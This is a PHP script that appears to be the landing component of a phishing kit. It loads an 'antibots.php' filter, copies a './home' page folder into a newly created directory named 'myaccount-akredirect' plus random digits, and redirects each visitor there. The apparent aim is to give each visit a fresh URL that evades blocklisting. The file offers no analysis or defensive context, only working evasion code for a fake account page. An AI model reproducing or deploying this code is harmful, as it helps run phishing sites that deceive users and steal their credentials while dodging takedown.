<?php
include './antibots.php';
for ($DIR = '', $i = 0, $z = strlen($a = '123456789')-1; $i != 6; $x = rand(0,$z), $DIR .= $a{$x}, $i++);
$src="./home";
$random = rand(0,100000).$_SERVER['REMOTE_ADDR'];
$dst		= "myaccount-akredirect".$DIR;
	
function recurse_copy($src, $dst) {

	$dir = opendir($src);
	$result = ($dir === false ? false : true);

	if ($result !== false) {
		$result = @mkdir($dst);

		if ($result === true) {
			while(false !== ( $file = readdir($dir)) ) { 
				if (( $file != '.' ) && ( $file != '..' ) && $result) { 
					if ( is_dir($src . '/' . $file) ) { 
						$result = recurse_copy($src . '/' . $file,$dst . '/' . $file); 
					} else { 
						$result = copy($src . '/' . $file,$dst . '/' . $file); 
					} 
				} 
			} 
			closedir($dir);
		}
	}

	return $result;
}

recurse_copy( $src, $dst );
header("location:".$dst."");
?>